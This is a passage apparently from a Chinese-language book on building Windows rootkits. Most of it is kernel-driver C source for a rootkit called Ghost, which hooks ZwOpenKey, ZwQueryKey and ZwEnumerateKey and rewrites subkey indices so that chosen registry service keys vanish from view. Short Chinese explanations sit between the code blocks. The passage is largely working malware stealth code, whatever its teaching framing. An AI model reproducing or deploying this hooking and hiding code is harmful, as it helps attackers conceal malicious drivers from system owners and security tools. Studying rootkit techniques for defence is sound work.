pKeyHandle->handle = hKey;
pKeyHandle->keyData = ExAllocatePool( PagedPool, sizeof(REG_KEY_DATA) );
if(pKeyHandle->keyData)
{
REG_KEY_DATA* pKeyData;
memset( pKeyHandle->keyData, 0, sizeof(REG_KEY_DATA) );
pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
pKeyData->subkeys = 0;
pKeyData->subkeyData = (SUBKEY_DATA*)ExAllocatePool(
PagedPool, sizeof(SUBKEY_DATA) );
if( pKeyData->subkeyData )
{
memset( pKeyData->subkeyData, 0, sizeof(SUBKEY_DATA) );
}
}
}
return pKeyHandle;
}
void AddIndices( KEY_HANDLE* pKeyHandle, ULONG index, ULONG newIndex )
{
REG_KEY_DATA* pKeyData = NULL;
if(( pKeyHandle ) && ( pKeyHandle->keyData ))
{
pKeyData =((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
while( pSubkeyData )
{
if( pSubkeyData->next == NULL )
{
pSubkeyData->next = (SUBKEY_DATA*)ExAllocatePool(
PagedPool, sizeof(SUBKEY_DATA));
if( pSubkeyData->next )
{
memset( pSubkeyData->next, 0, sizeof(SUBKEY_DATA) );
pSubkeyData->next->subkeyIndex = index;
pSubkeyData->next->newIndex = newIndex;
break;
}
}
pSubkeyData = pSubkeyData->next;
}
}
}
}
// increment next newIndex
SUBKEY_DATA* AdjustNextNewIndex( SUBKEY_DATA* pSubkeyData, int offset )
{
SUBKEY_DATA* targetKey = NULL;;
while( pSubkeyData->next != NULL )
{
if( pSubkeyData->next->subkeyIndex + offset != pSubkeyData->next->newIndex )
{
// next key is a hidden key
// so increment newIndex
if( targetKey == NULL )
{
targetKey = pSubkeyData;
}
else
{
// adjust all new indices
// until next non hidden key
SUBKEY_DATA* tempKey = targetKey;
while( tempKey != pSubkeyData)
{
tempKey->next->newIndex++;
tempKey = tempKey->next;
}
}
targetKey->newIndex++;
offset++;
}
else
{
// keep incrementing newIndex
// until next key is not hidden
if( targetKey )
break;
}
pSubkeyData = pSubkeyData->next;
}
// list is now good up to target key
return targetKey;
}
// reindex key pair list when more than one
// sub key is hidden under a single key
void AdjustIndices( KEY_HANDLE* pKeyHandle, int hiddenKeys )
{
KeAcquireSpinLock(&g_registrySpinLock, &g_pCurrentIRQL);
if( pKeyHandle->keyData )
{
REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
int offset = 0;
SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
// loop through indices looking for hidden keys
while( pSubkeyData->next != NULL )
{
if( pSubkeyData->subkeyIndex + offset != pSubkeyData->newIndex )
{
hiddenKeys--;
// adjust next hidden key
offset++;
pSubkeyData = AdjustNextNewIndex( pSubkeyData, offset );
offset = pSubkeyData->newIndex - pSubkeyData->subkeyIndex;
}
pSubkeyData = pSubkeyData->next;
// no need to exceed show count
if( !hiddenKeys )
break;
}
}
}
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
}
// create a key list with index data that skips hidden keys
int CreateHiddenKeyIndices( HANDLE hKey )
{
int status;
int index = 0;
int offset = 0;
int visibleSubkeys = 0;
PVOID pInfoStruct;
ULONG infoStructSize;
ULONG resultLength;
KEY_HANDLE* pKeyHandle = 0;
pKeyHandle = FindKeyHandle( hKey );
// remove old sub key data if it exists
if( pKeyHandle )
FreeKeyHandle( hKey );
pKeyHandle = AllocateKeyHandle( hKey );
// size must be larger than any of the info structures
infoStructSize = 256;
pInfoStruct = ExAllocatePool( PagedPool, infoStructSize );
if ( pInfoStruct == NULL )
return -1;
// enumerate subkeys
for(;;)
{
status = ZwEnumerateKey(
hKey,
index,
KeyBasicInformation,
pInfoStruct,
infoStructSize,
&resultLength);
if( status == STATUS_SUCCESS )
{
// Add one compare for each hidden key defined
if( !wcsncmp(
((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
g_key1,
SERVICE_KEY1_LENGTH) ||
!wcsncmp(
((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
g_key2,
SERVICE_KEY2_LENGTH) ||
!wcsncmp(
((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
g_key3,
SERVICE_KEY3_LENGTH) )
{
offset++;
}
else
{
visibleSubkeys++;
}
AddIndices( pKeyHandle, index, (index + offset));
index++;
}
else
{
// STATUS_NO_MORE_ENTRIES
break;
}
}
if( offset > 1 )
{
// required if more than one sub key was found
AdjustIndices( pKeyHandle, offset );
}
ExFreePool( (PVOID)pInfoStruct );
/* update data about this handle */
if( pKeyHandle )
{
REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
pKeyData->subkeys = visibleSubkeys;
}
AddNewKeyHandle( pKeyHandle );
}
return 0;
}
注意SSSDriver1, SSSDriver2, 和MyDeviceDriver 在本书所编写的rootkit里是任意选择的项，
主要用来展示怎么隐藏两个连续的项．在加载了rootkit后就会创建MyDeviceDriver这个项.
当rootkit启动后，你需要在注册表中添加SSSDriver1 和SSSDriver2这两个项，然后你就能看
到它们神奇般地消失了．
Ghost.c
Ghost.c
Ghost.c
Ghost.c
Ghost.c 主要做了如下的一些修改：包含进了registryManager.h、为被挂钩的函数定义了保存
变量、摘除在 hookManager.c 里添加的三个内核钩子，然后调用按键数据清理函数..
下面代码是在添加在Ghost.c 顶部的：
#include "registryManager.h"
ZWOPENKEY OldZwOpenKey;
ZWQUERYKEY OldZwQueryKey;
ZWENUMERATEKEY OldZwEnumerateKey;
下面代码是在 OnUnload 里添加的:
UNHOOK( ZwOpenKey, OldZwOpenKey );
UNHOOK( ZwQueryKey, OldZwQueryKey );
UNHOOK( ZwEnumerateKey, OldZwEnumerateKey );
FreeKeyTrackingData();
hookManager.h
hookManager.h
hookManager.h
hookManager.h
文件 hookManager.h 定义了三个注册表项内核钩子
typedef NTSTATUS (*ZWOPENKEY)(
OUT PHANDLE KeyHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes );
extern ZWOPENKEY OldZwOpenKey;
NTSTATUS NewZwOpenKey(
OUT PHANDLE KeyHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes );
typedef NTSTATUS (*ZWQUERYKEY)(
IN HANDLE KeyHandle,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength );
extern ZWQUERYKEY OldZwQueryKey;
NTSTATUS NewZwQueryKey(
IN HANDLE KeyHandle,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength );
typedef NTSTATUS (*ZWENUMERATEKEY)(
IN HANDLE KeyHandle,
IN ULONG Index,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength );
extern ZWENUMERATEKEY OldZwEnumerateKey;
NTSTATUS NewZwEnumerateKey(
IN HANDLE KeyHandle,
IN ULONG Index,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength );
另外，hookManaget.h 定义了一个用来从句柄获取项名的未公开函数;
NTSYSAPI
NTSTATUS
NTAPI
ObQueryNameString(
IN PVOID
Object,
OUT POBJECT_NAME_INFORMATION
ObjectNameInfo,
IN ULONG
Length,
OUT PULONG
ReturnLength );
hookManager.c
hookManager.c
hookManager.c
hookManager.c
文件hookManager.c 实现了3个注册表项内核钩子并且会调用项数据的初始化函数，下面是
在HookKernel里添加的：
InitializeKeyTracking();
HOOK( ZwOpenKey, NewZwOpenKey, OldZwOpenKey );
HOOK( ZwQueryKey, NewZwQueryKey, OldZwQueryKey );
HOOK( ZwEnumerateKey, NewZwEnumerateKey, OldZwEnumerateKey );
下面是用来实现3个注册表项内核钩子的5个函数：
// used by GetKeyName
// Get a pointer to an object from its handle
PVOID GetPointerByHandle( HANDLE handle )
{
PVOID pKey;
NTSTATUS status;
status = ObReferenceObjectByHandle( handle, 0, NULL, KernelMode, &pKey, NULL );
if( !NT_SUCCESS( status ) )
return NULL;
if( pKey )
ObDereferenceObject( pKey );
return pKey;
}
// used by NewZwOpenKey
// Get a registry key's name from its handle
void GetKeyName( HANDLE hKey, PUNICODE_STRING* ppKeyName )
{
PVOID pKey = NULL;
PUNICODE_STRING unicodeString;
PCHAR pBuffer;
ULONG length;
NTSTATUS status;
*ppKeyName = NULL;
pKey = GetPointerByHandle( hKey );
if( pKey )
{
pBuffer = (PCHAR)ExAllocatePool( NonPagedPool,
MAXKEYNAMELENGTH * 2 + sizeof(UNICODE_STRING) );
if( pBuffer )
{
memset( pBuffer, 0, MAXKEYNAMELENGTH * 2 + sizeof(UNICODE_STRING) );
unicodeString = (PUNICODE_STRING)pBuffer;
RtlInitEmptyUnicodeString( unicodeString,
(PWCHAR)((DWORD)unicodeString + sizeof(UNICODE_STRING)),
MAXKEYNAMELENGTH * 2 );
status = ObQueryNameString( pKey,
(POBJECT_NAME_INFORMATION)unicodeString,
MAXKEYNAMELENGTH, &length );
if( status == STATUS_SUCCESS )
*ppKeyName = unicodeString;
return;
}
}
return;
}
// create an index that skips hidden subkeys
// when the parent key is \\Services
NTSTATUS NewZwOpenKey( OUT PHANDLE KeyHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes )
{
int status;
status = OldZwOpenKey(
KeyHandle,
DesiredAccess,
ObjectAttributes );
if( status == STATUS_SUCCESS )
{